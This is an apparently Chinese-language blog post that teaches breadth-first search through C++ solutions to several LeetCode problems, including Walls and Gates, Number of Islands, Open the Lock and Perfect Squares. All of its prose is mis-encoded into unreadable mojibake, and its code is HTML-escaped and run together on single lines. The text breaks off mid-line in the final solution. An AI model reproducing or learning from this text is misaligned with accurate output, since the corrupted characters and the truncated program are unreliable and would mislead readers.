    <content><![CDATA[å‰è¨€èº«åœ¨å¤§ CS æ™‚ä»£ï¼Œæœ‰è¶Šä¾†è¶Šå¤šäººæŠ•å…¥åˆ·é¡Œçš„è¡Œåˆ—ï¼Œåœ¨çœ¼èŠ±æ’©äº‚çš„é¡Œæµ·ä¸­ï¼Œè¦æƒ³æœ‰æ•ˆç‡åœ°åˆ·é¡Œï¼Œå°±éœ€è¦æŒæ¡é¡Œç›®è§£æ³•ä¸­ï¼Œå¯ä»¥åœ¨è¨±å¤šåœ°æ–¹æ‡‰ç”¨çš„è§€å¿µï¼Œæ‰èƒ½ä»¥ç°¡ç¦¦ç¹ã€‚ Huli å¯«çš„ ç¨‹å¼è§£é¡Œæ–°æ‰‹å…¥é–€æ³¨æ„äº‹é … è¬›å¾—å¾ˆå¥½ï¼Œå¯«é¡Œç›®æ˜¯ç‚ºäº†å­¸æœƒè§£é¡Œçš„æ€è€ƒæ–¹æ³•ï¼Œç¢ºä¿è‡ªå·±æŒæ¡é‡è¦çš„è³‡æ–™çµæ§‹è·Ÿæ¼”ç®—æ³•ã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘æƒ³è¦å¯«é€™ç³»åˆ—çš„æ–‡ç« ï¼ŒæŠŠå¤šå€‹æ•£è½åœ¨å„è™•çš„é¡Œç›®éŠœæ¥èµ·ä¾†ï¼Œä»¥å¾Œçœ‹åˆ°ç›¸ä¼¼çš„å•é¡Œå°±å¯ä»¥èˆ‰ä¸€åä¸‰ï¼Œè€Œä¸æ˜¯å»èƒŒå„é¡Œç›®çš„è§£æ³•ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œä¹‹å‰é‡éä¸€é¡Œé›»è©±é¢è©¦ï¼Œå•åˆ°çš„é¡Œç›®æ˜¯ï¼š
Input: vector&lt;bool&gt; holidays, int ptoholidays è¡¨ç¤ºå¹³æ—¥æˆ–å‡æ—¥ï¼Œä¾‹å¦‚ 0000011 è¡¨ç¤ºå‰é¢ 5 å¤©æ˜¯å¹³æ—¥ï¼Œå¾Œé¢ 2 å¤©æ˜¯å‡æ—¥ã€‚pto è¡¨ç¤ºæœ€å¤šå¯ä»¥æ”¾å¹¾å¤©å‡ã€‚Output: è¨ˆç®—åœ¨å¯ä»¥ç”¨å®Œ pto çš„æƒ…æ³ä¸‹ï¼Œæœ€ä¹…å¯ä»¥æ”¾å¤šé•·çš„å‡ã€‚ç¯„ä¾‹ï¼šholidays = &#123;0,0,0,0,0,1,1&#125;, pto = 2, output = 4     å› ç‚ºå¯ä»¥æ”¾ &#123;0,0,0,1,1,1,1&#125;

åŸºæœ¬ä¸Šå› ç‚ºä¹‹å‰æœ‰å¯«é Sliding Window çš„ patternï¼Œæ‰€ä»¥é€™é¡Œå¾ˆå¿«å°±å¯«å‡ºä¾†äº†ï¼Œä¹Ÿé †åˆ©é€²åˆ°ä¸‹ä¸€é—œï¼Œæ‰€ä»¥å¤§å®¶ä¸éœ€è¦è¿½æ±‚æŠŠé¡Œç›®éƒ½åˆ·å®Œï¼Œè€Œæ˜¯æŒæ¡å¥½é‡è¦çš„åŸºç¤ï¼Œæ¥ä¸‹ä¾†å°±æ˜¯æ‡‰ç”¨é€™äº›åŸºç¤å°±å¯ä»¥é¢å°å¾ˆå¤šè®ŠåŒ–é¡Œï¼ˆç•¶ç„¶é‚„æ˜¯æœƒæœ‰ä¸€äº›è§£æ³•å¾ˆå·§å¦™çš„é¡Œç›®ï¼Œä½†å…¶å¯¦å¤§éƒ¨åˆ†å…¬å¸ä¸æœƒç¡¬å‡ºå·§å¦™é¡Œï¼‰ã€‚
æ”¾ä¸Šç¨‹å¼ç¢¼çµ¦å¤§å®¶åƒè€ƒï¼š
#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int longest_holidays(const vector&lt;bool&gt;&amp; holidays, int pto) &#123;    int longestHoliday = -1, windowStart = 0;    for(int windowEnd = 0; windowEnd &lt; holidays.size(); ++windowEnd) &#123;        if(holidays[windowEnd] == 0) &#123;            -- pto;        &#125;        // Shrink window size        while(pto &lt; 0) &#123;            if(holidays[windowStart++] == 0) &#123;                ++ pto;            &#125;        &#125;        // Compare valid window size and longestHoliday        longestHoliday = max(longestHoliday, windowEnd - windowStart + 1);    &#125;    return longestHoliday;&#125;int main()&#123;    // 000001100000110000111    vector&lt;bool&gt; holidays = &#123;0,0,0,0,0,1,1,0,0,0,0,0,1,1,0,0,0,0,1,1,1&#125;;    int longest_holiday = longest_holidays(holidays, 9);    cout &lt;&lt; &quot;My longest holiday: &quot; &lt;&lt; longest_holiday &lt;&lt; &quot;, hooray!\n&quot;;    return 0;&#125;

ä¸Šé¢é€™é¡Œé‚„æœ‰ä¸€å€‹ follow-up å•é¡Œï¼Œå¯ä»¥çœ‹æˆ‘çš„ é¢ç¶“åˆ†äº«ã€‚
Breadth-First Search ç°¡ä»‹è¨€æ­¸æ­£å‚³ï¼Œä»Šå¤©è¦ä¾†è·Ÿå¤§å®¶ä»‹ç´¹ç›¸ç•¶åŸºç¤çš„æ¼”ç®—æ³• pattern - Breadth-First Searchï¼Œé›–ç„¶ BFS æ˜¯åŸºç¤ä¸­çš„åŸºç¤ï¼Œå¤§å®¶å¤šå°‘éƒ½æœƒï¼Œä½†ä½ çœŸçš„ç¢ºå®šè‡ªå·±é™¤äº†åœ¨ tree è·Ÿ graph é€™äº›é¡¯è€Œæ˜“è¦‹çš„é¡Œå‹ä»¥å¤–ï¼Œéƒ½èƒ½æ´»ç”¨ BFS å—ï¼Ÿ
æˆ‘å€‘å…ˆçœ‹ä¸€å€‹é¡Œç›® - Leetcode #279 - Perfect Squaresï¼š

å¦‚æœæ²’ä»€éº¼åˆ·é¡Œç¶“é©—ï¼Œå¯èƒ½æœƒæƒ³è¦ç”¨æš´åŠ›çš„æšèˆ‰æ–¹æ³•ä¾†è§£é€™å€‹å•é¡Œï¼›å¦‚æœæœ‰ä¸€äº›åˆ·é¡Œç¶“é©—ï¼Œå¯èƒ½æœƒæƒ³åˆ°ç”¨ Dynamic Programming ä¾†è§£ã€‚ä½†å…¶å¯¦ï¼Œé€™é¡Œä¹Ÿå¯ä»¥ç”¨ BFS è§£ï¼è€Œä¸”å¯¦ä½œéå¸¸ç°¡å–®ï¼Œèˆ‰é€™å€‹ä¾‹å­æ˜¯æƒ³è®“å¤§å®¶çœ‹çœ‹ BFS ä¹Ÿå¯ä»¥æ‡‰ç”¨åœ¨æ²’æœ‰æ˜é¡¯ graph çµæ§‹çš„å•é¡Œä¸Šï¼Œæˆ‘å€‘æœƒåœ¨ç¬¬å››å€‹ç¯„ä¾‹ä¸­è§£é‡‹æ€éº¼ç”¨ BFS ä¾†è§£é€™é¡Œã€‚
åœ¨é€²åˆ°é¡Œç›®ä¹‹å‰ï¼Œå…ˆçµ¦å¤§å®¶ BFS å¯¦ä½œçš„æ¨¡æ¿ï¼Œé€™æ¨£åªè¦å¯«éå¹¾é¡Œï¼Œä¹‹å¾Œåœ¨å¯¦ä½œ BFS å°±ä¸å®¹æ˜“å‡ºéŒ¯ï¼Œå› ç‚ºåŸºæœ¬çš„æ¨¡æ¿ç›¸é€šï¼Œåªè¦å°‡æ³¨æ„åŠ›é›†ä¸­åœ¨å„é¡Œç›®ä¸åŒçš„ç´°ç¯€ä¸Šå°±å¥½ã€‚
BFS template 1BFS è·Ÿ queue é€™å€‹è³‡æ–™çµæ§‹æ˜¯å¥½å¤¥ä¼´ï¼Œä½¿ç”¨ queue è®“ BFS çš„å¯¦ä½œè®Šå¾—å¾ˆç°¡å–®ï¼Œæ¯”å¦‚èªªä¸‹é¢é€™å€‹å˜—è©¦è¨ˆç®— root node è·Ÿ target node è·é›¢çš„ pseudo codeï¼š
/** * Return the length of the shortest path between root and target node. */int BFS(Node root, Node target) &#123;    queue&lt;Node&gt; queue; // store all nodes which are waiting to be processed    step = 0;      // number of steps neeeded from root to current node    // initialize    add root to queue;    // BFS    while (queue is not empty) &#123;        step = step + 1;        // iterate the nodes which are already in the queue        int size = q.size();        for (int i = 0; i &lt; size; ++i) &#123;            Node cur = the first node in queue;            return step if cur is target;            for (Node next : the neighbors of cur) &#123;                add next to queue;            &#125;            remove the first node from queue;        &#125;    &#125;    return -1;  // there is no path from root to target&#125;

BFS template 2æœ‰æ™‚å€™ï¼Œæˆ‘å€‘å¿…é ˆè¦é¿å…èµ°åˆ°é‡è¤‡çš„ nodeï¼ˆä¾‹å¦‚åœ¨ cyclic graph ä¸­ï¼Œå°±å¯èƒ½åˆèµ°å›èµ·é»ï¼‰ï¼Œæ‰ä¸æœƒè®“ BFS ç„¡æ³•çµæŸï¼Œæ‰€ä»¥éœ€è¦ç´€éŒ„å“ªäº› node å·²ç¶“èµ°éï¼Œæ¨¡æ¿å¦‚ä¸‹ï¼š
/** * Return the length of the shortest path between root and target node. */int BFS(Node root, Node target) &#123;    queue&lt;Node&gt; queue;  // store all nodes which are waiting to be processed    Set&lt;Node&gt; visited;  // store all the nodes that we&#x27;ve visited    step = 0;       // number of steps neeeded from root to current node    // initialize    add root to queue;    add root to visited;    // BFS    while (queue is not empty) &#123;        step = step + 1;        // iterate the nodes which are already in the queue        int size = queue.size();        for (int i = 0; i &lt; size; ++i) &#123;            Node cur = the first node in queue;            return step if cur is target;            for (Node next : the neighbors of cur) &#123;                if (next is not in visited) &#123;                    add next to queue;                    add next to visited;                &#125;            &#125;            remove the first node from queue;        &#125;    &#125;    return -1;  // there is no path from root to target&#125;

Breadth-First Search çš„ç¬¬ä¸€å€‹ç¯„ä¾‹ - Leetcode #286 - Walls and Gatesé¡Œç›®
é€™å€‹é¡Œç›®æ¯”è¼ƒæ˜é¡¯æœ‰ graph çš„æ¨£å­ï¼Œå› ç‚ºæ¯ä¸€æ­¥éƒ½åªèƒ½èµ°åˆ°ä¸Š&#x2F;ä¸‹&#x2F;å·¦&#x2F;å³çš„å…¶ä¸­ä¸€å€‹é„°å±…ï¼Œè€Œä¸”æ˜¯è¦æ‰¾ â€œè·é›¢æœ€è¿‘â€ çš„é–€ï¼Œæ‰€ä»¥æ¯”è¼ƒç›´è¦ºæœƒæƒ³åˆ°å¯ä»¥ç”¨ BFSï¼Œæˆ‘å€‘å°±ç›´æ¥ä¾†çœ‹çœ‹è§£æ³•ã€‚
Breadth-First Search è§£æ³•è¦åš BFSï¼Œæˆ‘å€‘æœ‰å…©ç¨®é¸æ“‡ï¼Œç¬¬ä¸€ç¨®æ˜¯å¾æ¯å€‹æˆ¿é–“é–‹å§‹ï¼Œå°‹æ‰¾é›¢é€™å€‹æˆ¿é–“æœ€è¿‘çš„é–€ï¼›ç¬¬äºŒç¨®å‰‡æ˜¯å…ˆæŠŠæ¯å€‹é–€éƒ½æ”¾é€² queue è£¡é¢ï¼Œæ¯æ¬¡éƒ½åªèµ°ä¸€æ­¥ï¼Œå¦‚æœé‡åˆ°çš„æ˜¯æˆ¿é–“ï¼Œå°±æ›´æ–°æˆ¿é–“åˆ°é–€å£çš„æ­¥æ•¸ã€‚
é›–ç„¶é€™é¡Œçš„æƒ³æ³•å¾ˆç°¡å–®ï¼Œå¯æ˜¯å¦‚æœä½ å° BFS çš„æ¨¡æ¿é‚„ä¸æ˜¯å¾ˆç†Ÿï¼Œé‚„æ˜¯æœƒéœ€è¦èŠ±ä¸€äº›æ™‚é–“æƒ³ä¸€æƒ³é‚è¼¯è¦æ€éº¼å¯«çš„ï¼Œæ‰€ä»¥ä¸ç”¨ç·Šå¼µï¼Œæ…¢æ…¢åœ°æƒ³éä¸€éï¼Œç›¡åŠ›è‡ªå·±å¯«å¯«çœ‹ï¼Œå¯«ä¸å‡ºä¾†å°±çœ‹çœ‹ç­”æ¡ˆï¼Œçœ‹å®Œè‡ªå·±æƒ³ä¸€éå†å¯«ï¼Œåè¦†å¹¾æ¬¡å°±æœƒè¶Šä¾†è¶Šç†Ÿæ‚‰ã€‚æä¾›ä¸€ä»½ C++ ç‰ˆæœ¬çš„å¯¦ä½œå¦‚ä¸‹ï¼š
class Solution &#123;public:    void wallsAndGates(vector&lt;vector&lt;int&gt;&gt;&amp; rooms) &#123;        // Check corner cases        int m = rooms.size();        if(m &lt; 1) &#123; return; &#125;        int n = rooms[0].size();        if(n &lt; 1) &#123; return; &#125;        // Prepare for BFS        int GATE = 0, WALL = -1, ROOM = numeric_limits&lt;int&gt;::max();        queue&lt;pair&lt;int,int&gt;&gt; q;        vector&lt;pair&lt;int,int&gt;&gt; dirs&#123;&#123;0, -1&#125;, &#123;-1, 0&#125;, &#123;0, 1&#125;, &#123;1, 0&#125;&#125;;        // Put all gates into queue        for(int i = 0; i &lt; m; ++i) &#123;            for(int j = 0; j &lt; n; ++j) &#123;                if(rooms[i][j] == GATE) q.push(&#123;i,j&#125;);            &#125;        &#125;        // Start BFS        int steps = 0;        while(!q.empty()) &#123;            for(int sz = q.size()-1; sz &gt;= 0; --sz) &#123;                pair&lt;int, int&gt; cur = q.front();                q.pop();                if(rooms[cur.first][cur.second] == ROOM) &#123;                    rooms[cur.first][cur.second] = steps;                &#125;                if(rooms[cur.first][cur.second] != WALL) &#123;                    // Traverse neighbor                    for(int i = 0; i &lt; dirs.size(); ++i) &#123;                        cur.first += dirs[i].first;                        cur.second += dirs[i].second;                        if(isValid(cur, m, n) &amp;&amp; rooms[cur.first][cur.second] == ROOM) &#123;                            q.push(cur);                        &#125;                        cur.first -= dirs[i].first;                        cur.second -= dirs[i].second;                    &#125;                &#125;            &#125;            ++steps;        &#125;    &#125;private:    bool isValid(const pair&lt;int, int&gt;&amp; cur, const int&amp; m, const int&amp; n) &#123;        return cur.first &gt;= 0 &amp;&amp; cur.first &lt; m &amp;&amp; cur.second &gt;= 0 &amp;&amp; cur.second &lt; n;    &#125;&#125;;

Breadth-First Search çš„ç¬¬äºŒå€‹ç¯„ä¾‹ - Leetcode #200 - Number of Islandsé¡Œç›®
Depth-First Search è§£æ³•é€™é¡Œæ‡‰è©²ç®—æ˜¯éå¸¸ç¶“å…¸çš„å•é¡Œï¼Œç›®å‰åœ¨é¢è©¦ä¸­å‡ºç¾çš„é »ç‡ä¹Ÿé‚„æ˜¯å¾ˆé«˜ï¼Œä»¥å¯«ç¨‹å¼çš„ç°¡æ½”åº¦ä¾†èªªï¼ŒDFS æ˜¯æ¯”è¼ƒå®¹æ˜“å¯«çš„ï¼Œæ¦‚å¿µä¸Šå°±æ˜¯ï¼Œæ¯æ¬¡æˆ‘å€‘é‡åˆ°ä¸€å€‹å³¶çš„é‚Šç•Œï¼ˆä¹Ÿå°±æ˜¯ â€˜1â€™ çš„åœ°æ–¹ï¼‰ï¼Œæˆ‘å€‘å°±å‘¼å« DFS function æŠŠè·Ÿé€™å€‹ â€˜1â€™ ç›¸é„°çš„ â€˜1â€™ éƒ½è®Šæˆ â€˜0â€™ï¼Œå¯¦ä½œå¦‚ä¸‹ï¼š
class Solution &#123;public:    int numIslands(vector&lt;vector&lt;char&gt;&gt;&amp; grid) &#123;        int m = grid.size(), n = m ? grid[0].size() : 0, islands = 0;        // èµ°éçŸ©é™£çš„æ‰€æœ‰ elementï¼Œåªè¦é‡åˆ°å³¶ï¼Œå°±æŠŠå³¶éƒ½æ¶ˆæ»…(å³ &#x27;1&#x27; -&gt; &#x27;0&#x27;)        for (int i = 0; i &lt; m; i++) &#123;            for (int j = 0; j &lt; n; j++) &#123;                if (grid[i][j] == &#x27;1&#x27;) &#123;                    islands++;                    dfs(grid, m, n, i, j);                &#125;            &#125;        &#125;        return islands;    &#125;private:    void dfs(vector&lt;vector&lt;char&gt;&gt;&amp; grid, const int&amp; m, const int&amp; n, const int&amp; i, const int&amp; j) &#123;        if(grid[i][j] == &#x27;0&#x27;) return;        grid[i][j] = &#x27;0&#x27;;        if(i - 1 &gt;= 0) &#123; dfs(grid, m, n, i-1, j); &#125;        if(i + 1 &lt; m)  &#123; dfs(grid, m, n, i+1, j); &#125;        if(j - 1 &gt;= 0) &#123; dfs(grid, m, n, i, j-1); &#125;        if(j + 1 &lt; n)  &#123; dfs(grid, m, n, i, j+1); &#125;    &#125;&#125;;

Breadth-First Search è§£æ³•DFS çš„å¯¦ä½œé›–ç„¶ç°¡æ½”ï¼Œå¯æ˜¯ï¼Œå¦‚æœè¼¸å…¥çš„çŸ©é™£éå¸¸å¤§ï¼Œä¸¦ä¸”åŒ…å«è‘—å¾ˆå¤§çš„å³¶ï¼Œé‚£éš¨è‘— DFS çš„éè¿´å‘¼å«å±¤æ•¸å¢åŠ ï¼Œæ˜¯æœ‰å¯èƒ½ç”¢ç”Ÿ stack overflow çš„ï¼Œæ‰€ä»¥å¦‚æœèƒ½ç”¨ BFS è§£æ±ºï¼Œå°±æœƒæ˜¯æ¯”è¼ƒå®‰å…¨çš„è§£æ³•ã€‚
ä¸€æ¨£ï¼Œé›–ç„¶æƒ³æ³•ä¸Šå¾ˆç°¡å–®ï¼Œä½†å¯¦ä½œä¸Šé‚„æ˜¯éœ€è¦å¤šå¯«å¹¾æ¬¡æ‰æœƒç†Ÿæ‚‰ï¼Œé™„ä¸Šä¸€ä»½ BFS çš„å¯¦ä½œçµ¦å¤§å®¶åƒè€ƒï¼š
class Solution &#123;public:    int numIslands(vector&lt;vector&lt;char&gt;&gt;&amp; grid) &#123;        int m = grid.size(), n = m ? grid[0].size() : 0, islands = 0, offsets[] = &#123;0, 1, 0, -1, 0&#125;;        for (int i = 0; i &lt; m; i++) &#123;            for (int j = 0; j &lt; n; j++) &#123;                if (grid[i][j] == &#x27;1&#x27;) &#123;                    islands++;                    grid[i][j] = &#x27;0&#x27;;                    queue&lt;pair&lt;int, int&gt;&gt; todo;                    todo.push(&#123;i, j&#125;);                    while (!todo.empty()) &#123;                        pair&lt;int, int&gt; p = todo.front();                        todo.pop();                        for (int k = 0; k &lt; 4; k++) &#123;                            int r = p.first + offsets[k], c = p.second + offsets[k + 1];                            if (r &gt;= 0 &amp;&amp; r &lt; m &amp;&amp; c &gt;= 0 &amp;&amp; c &lt; n &amp;&amp; grid[r][c] == &#x27;1&#x27;) &#123;                                grid[r][c] = &#x27;0&#x27;;                                todo.push(&#123;r, c&#125;);                            &#125;                        &#125;                    &#125;                &#125;            &#125;        &#125;        return islands;    &#125;&#125;;

Breadth-First Search çš„ç¬¬ä¸‰å€‹ç¯„ä¾‹ - Leetcode #752 - Open the Locké¡Œç›®
é€™ä¸€é¡Œé–‹å§‹è®Šå¾—æ¯”è¼ƒæœ‰è¶£ï¼Œå› ç‚ºä¸€çœ‹åˆ°é€™å€‹é¡Œç›®çš„æ™‚å€™ï¼Œæœªå¿…æœƒæƒ³åˆ°è¦ç”¨ BFSï¼Œæ‰€ä»¥æ¥ä¸‹ä¾†ï¼Œè®“æˆ‘å…ˆåˆ†äº«ä¸€ä¸‹æ€è€ƒçš„æ–¹æ³•ã€‚
æ€è€ƒæ–¹æ³•é€™é¡Œé›–ç„¶ä¹çœ‹ä¹‹ä¸‹ä¸æœƒç›´æ¥æƒ³åˆ°è¦ç”¨ BFSï¼Œä½†å…¶å¯¦é‚„æ˜¯æœ‰å¾ˆå¤šè››çµ²é¦¬è·¡ï¼Œæ¯”å¦‚èªªï¼š

æˆ‘å€‘å¾ 0000 é–‹å§‹ï¼Œæ‰€ä»¥æœ‰ä¸€å€‹èµ·é»ã€‚
å¸Œæœ›å°‹æ‰¾çš„æ˜¯ 0000 åˆ° target ä¹‹é–“çš„ â€œæœ€çŸ­è·é›¢â€ã€‚

çœ‹åˆ°é€™å…©å€‹æç¤ºï¼Œè…¦æµ·ä¸­å°±æœƒé–‹å§‹æµ®ç¾ä¸€å€‹å¾ 0000 ç‚º rootï¼Œé–‹å§‹æ¢ç´¢ç›´åˆ°èµ°åˆ° target çš„ä¸€å€‹æœå°‹éç¨‹ï¼š
0000 -&gt; 1000, 9000, 0100, 0900, 0010, 0090, 0001, 0009 -&gt; â€¦ -&gt; â€¦ -&gt; target
æ‰€ä»¥å°±é–‹å§‹æœ‰å¯ä»¥ä½¿ç”¨ BFS çš„å½±å­å‡ºç¾ã€‚æ›å¥è©±èªªï¼Œå› ç‚ºçœ‹åˆ°æœ‰èµ·é»ã€è¦æ±‚æœ€çŸ­è·é›¢ï¼Œæ‰€ä»¥æƒ³äº† â€œèµ°ä¸€æ­¥â€ æ˜¯ä»€éº¼æ„æ€ï¼Ÿç„¶å¾Œæƒ³åˆ°å°±æ˜¯æŠŠå…¶ä¸­ä¸€å€‹æ•¸å­— +1 æˆ– -1ã€‚æ¥è‘—å°±å¯ä»¥å†å»¶ä¼¸ï¼Œç™¼ç¾é€™å°±æ˜¯ä¸€å€‹å¾ 0000 é–‹å§‹ï¼Œç„¶å¾Œå‡è¨­ deadends æ˜¯å·²ç¶“ visit éæ‰€ä»¥ä¸èƒ½å†èµ°ï¼Œçš„ä¸€å€‹ BFS å•é¡Œã€‚
Breadth-First Search è§£æ³•class Solution &#123;public:    int openLock(vector&lt;string&gt;&amp; deadends, string target) &#123;        // Prepare for BFS        // å› ç‚ºä¸èƒ½èµ°åˆ° deadends è£¡é¢çš„æ’åˆ—ï¼Œæ‰€ä»¥æˆ‘å€‘ç›´æ¥æ”¾é€² visitedï¼Œé€™æ¨£åš BFS æ™‚å°±ä¸æœƒè€ƒæ…®é€™äº›è·¯ç·š        unordered_set&lt;string&gt; visited(deadends.begin(), deadends.end());        array&lt;char, 10&gt; digit= &#123;&#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;&#125;;        queue&lt;string&gt; todo;        // å‡è¨­ 0000 æ²’æœ‰åœ¨ visited(ä¹Ÿå°±æ˜¯ deadends è£¡æ²’æœ‰) ä¸­ï¼Œæˆ‘å€‘æ‰éœ€è¦é–‹å§‹å°‹æ‰¾        if(!visited.count(&quot;0000&quot;)) &#123;            todo.push(&quot;0000&quot;);            visited.insert(&quot;0000&quot;);        &#125;        // Start BFS        int steps = -1;        while(!todo.empty()) &#123;            ++steps;            for(int sz = todo.size() - 1; sz &gt;= 0; --sz) &#123;                string cur = todo.front();                todo.pop();                // Check if it&#x27;s target                if(cur == target) &#123;                    return steps;                &#125;                // Go through neighbors                // å¦‚ä½•æ‰¾åˆ°å°çš„ neighbor ä¹Ÿæ˜¯é€™é¡Œæ¯”è¼ƒ tricky çš„åœ°æ–¹ä¹‹ä¸€                for(int i = 0; i &lt; 4; ++i) &#123;                    for(int j = -1; j &lt;= 1; j += 2) &#123;                        string neighbor = cur;                        // Wrap around index to prevent out-of-bound error                        neighbor[i] = digit[(neighbor[i]-&#x27;0&#x27;+j+10) % 10];                        if(!visited.count(neighbor)) &#123;                            todo.push(neighbor);                            visited.insert(neighbor);                        &#125;                    &#125;                &#125;            &#125;        &#125;        return -1;    &#125;&#125;;

å¯«å®Œé€™é¡Œï¼Œå¦‚æœä½ æ˜¯ BFS æ–°æ‰‹ï¼Œæ‡‰è©²æœƒè¦ºå¾—é —å¥½ç©ï¼Œå› ç‚ºé€™é¡Œçš„é„°å±…æ‰¾æ³•è·Ÿä¹‹å‰æœ‰æ˜é¡¯ matrix çµæ§‹çš„æƒ…æ³ä¸å¤ªä¸€æ¨£ï¼Œè€Œæ˜¯è®Šæˆåœ¨å¦ä¸€å€‹æŠ½è±¡çš„æœç´¢ç©ºé–“ä¸­åš BFSã€‚
Breadth-First Search çš„ç¬¬å››å€‹ç¯„ä¾‹ - Leetcode #279 - Perfect Squaresé¡Œç›®
æš´åŠ›è§£æš´åŠ›æ³•å¾ˆç›´è¦ºï¼Œåæ­£å°±æ¯ç¨®çµ„åˆéƒ½è©¦è©¦çœ‹å°±å°äº†ï¼Œä¾‹å¦‚è‹¥è¦çœ‹ 12 è‡³å°‘è¦ç”±å¹¾å€‹ perfect suqare number çµ„æˆï¼Œé‚£å°±çœ‹ â€œ1 è‡³å°‘è¦å¹¾å€‹ + 11 è‡³å°‘è¦å¹¾å€‹â€ã€â€2 è‡³å°‘è¦å¹¾å€‹ + 10 è‡³å°‘è¦å¹¾å€‹â€ â€¦ ä¾æ­¤é¡æ¨ï¼Œç›´åˆ°æ¯”è¼ƒéæ‰€æœ‰å¯èƒ½çš„æ‹†åˆ†æ–¹æ³•ï¼Œå°±çŸ¥é“æœ€å°‘è¦å¹¾å€‹ï¼Œå¯¦ä½œå¦‚ä¸‹ï¼š
class Solution &#123;public:    int numSquares(int n) &#123;        if(isPerfectSquare(n)) &#123;            return 1;        &#125;        int res = n;        for(int i = 1; i &lt;= n / 2; ++i) &#123;            int comb = numSquares(i) + numSquares(n - i);            if(comb &lt; res) &#123;                res = comb;            &#125;        &#125;        return res;    &#125;private:    bool isPerfectSquare(double x) &#123;      // Find floating point value of square root of x.      double sr = sqrt(x);      // If square root is an integer      return ((sr - floor(sr)) == 0);    &#125;&#125;;

å¾ˆé¡¯ç„¶ï¼Œé€™ç¨®æ–¹æ³•æœ‰å¤ æ…¢ï¼Œåœ¨ leetcode ä¸Šé¢è·‘ä¹Ÿç¢ºå¯¦æœƒè¶…æ™‚ã€‚é›–ç„¶å¯ä»¥ç”¨ memoizationã€Dynamic Programmingï¼Œä¸éä»Šå¤©çš„é‡é»æ˜¯ BFSï¼Œæ‰€ä»¥æˆ‘å€‘ä¾†æ¢è¨ä¸€ä¸‹ BFS è§£ã€‚
Breadth-First Search è§£æ³•å¦‚æœä½ æœ‰è¾¦æ³•æƒ³åˆ° BFSï¼Œæ‡‰è©²æœƒè¦ºå¾—æ»¿å¥½ç©çš„ã€‚é€™é¡Œçš„æ€è·¯å¦‚ä¸‹ï¼š

å¦‚æœ n æ˜¯ perfect squareï¼Œç­”æ¡ˆå°±æ˜¯ 1ã€‚
å¦‚æœ n å¯ä»¥ç”±å…©å€‹ perfect square çµ„æˆï¼Œç­”æ¡ˆå°±æ˜¯ 2ã€‚

æ‰€ä»¥æˆ‘å€‘å¦‚æœè¦ä½¿ç”¨ BFSï¼Œèµ·é»å°±æ˜¯æ‰€æœ‰çš„ perfect squareï¼
çœ‹ä¸€å€‹ç¯„ä¾‹ï¼š
n = 12èµ·é»ï¼š1, 4, 9èµ°ä¸€æ­¥ï¼š1+1 = 2, 1+4 = 5, 1 + 9 = 10, 4+4 = 8èµ°å…©æ­¥ï¼š2+1 = 3, 2+4 = 6, 2+9 = 11...

æ‰€ä»¥ï¼Œæ¯æ¬¡è¦æ‹œè¨ªçš„é„°å±…å°±æ˜¯ queue è£¡é¢çš„æ•¸å­—å†åŠ ä¸Šä¸€å€‹ perfect squareï¼
æƒ³æ‡‚è§€å¿µä¹‹å¾Œï¼Œå¯¦ä½œå‡ºä¾†å°±åªæ˜¯æ™‚é–“å•é¡Œï¼š
class Solution &#123;public:    int numSquares(int n) &#123;        // Declare data structure for BFS        unordered_set&lt;int&gt; visited;        queue&lt;int&gt; todo;        todo.push(0);        visited.insert(0);        // Start BFS        int steps = 0;        while(!todo.empty()) &#123;            ++steps;            for(int sz = todo.size() - 1; sz &gt;= 0; --sz) &#123;                // Retrieve current int                int cur = todo.front();                todo.pop();                for(int j = 1; j &lt; n; ++j) &#123;                    int sum = cur + j * j;                    if(sum == n) &#123; return steps; &#125;                    else if(sum &gt; n) &#123; break; &#125;                    else&#123;                        if(!visited.count(sum)) &#123;                            todo.push(sum);                            visited.insert(sum);                        &#125;                    &#125;                &#125;            &#125;        &#125;        return steps;    &#125;&#125;;

Breadth-First Search çš„ç¬¬äº”å€‹ç¯„ä¾‹ - Leetcode #1284 - Minimum Number of Flips to Convert Binary Matrix to Zero Matrixé¡Œç›®

é€™ä¸€é¡Œæ˜¯æˆ‘åœ¨æŸä¸€é€±çš„ Leetcode contest å¯«åˆ°çš„ï¼Œå› ç‚ºç•¶æ™‚æˆ‘æ­£å¥½å¯«å®Œä¸Šé¢å››å€‹ BFS çš„ç¯„ä¾‹é¡Œï¼Œå° BFS çš„ pattern å¾ˆæœ‰æ„Ÿè¦ºï¼Œæ‰€ä»¥é€™é¡Œå¾ˆå¿«å°±å¯«å‡ºä¾†äº†ã€‚
Breadth-First Search è§£æ³•å› ç‚ºæ¦‚å¿µä¸Šè·Ÿç¬¬ä¸‰å€‹ç¯„ä¾‹æœ‰é»åƒï¼Œéƒ½æ˜¯åœ¨è‡ªå·±æƒ³åƒä¸­çš„æœç´¢ç©ºé–“ä¸­é€²è¡Œ BFSï¼Œæ‰€ä»¥é€™é¡Œçš„æƒ³æ³•æˆ‘å°±ä¸è´…è¿°äº†ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯æŠŠæ•´å€‹ matrix çš„ç‹€æ…‹ç•¶ä½œ nodeï¼Œæ¯ç¿»ä¸€æ¬¡å°±æ˜¯èµ°ä¸€æ­¥ï¼Œå°±å¯ä»¥ç”¨ BFS è§£æ±ºäº†ï¼Œé™„ä¸Šç¨‹å¼ç¢¼ï¼š
class Solution &#123;public:    int minFlips(vector&lt;vector&lt;int&gt;&gt;&amp; mat) &#123;        // Check corner cases        int m = mat.size();        int n = m ? mat[0].size() : 0;        if(m &lt; 1 or n &lt; 1) &#123; return -1; &#125;        // Prepare for BFS        set&lt;vector&lt;vector&lt;int&gt;&gt;&gt; visited;        queue&lt;vector&lt;vector&lt;int&gt;&gt;&gt; q;        q.push(mat);        visited.insert(mat);        int steps = 0;        while(!q.empty()) &#123;            for(int sz = q.size() - 1; sz &gt;= 0; --sz) &#123;                vector&lt;vector&lt;int&gt;&gt; cur = q.front();                q.pop();                // å·²ç¶“æˆåŠŸç¿»æˆå…¨éƒ¨éƒ½æ˜¯ 0                if(allZero(cur)) &#123;                    return steps;                &#125;                for(int r = 0; r &lt; m; ++r) &#123;                    for(int c = 0; c 